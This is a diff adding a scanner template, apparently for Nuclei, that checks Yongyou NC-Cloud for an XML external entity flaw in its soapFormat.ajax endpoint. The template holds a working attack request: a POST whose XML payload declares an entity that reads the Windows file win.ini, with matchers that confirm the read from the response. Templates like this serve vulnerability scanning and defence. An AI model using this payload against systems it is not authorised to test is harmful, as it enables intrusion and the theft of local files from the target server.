@@ -1,0 +1,26 @@
+id: poc-yaml-yongyou-nc-cloud-soapformat-xxe
+
+info:
+  name: Yongyou NC-Cloud soapFormat XXE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: xxe
+
+http:
+  - raw:
+      - |
+        POST /uapws/soapFormat.ajax HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:///C://windows/win.ini"> ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "[fonts]"
+          - "[files]"
+        part: body
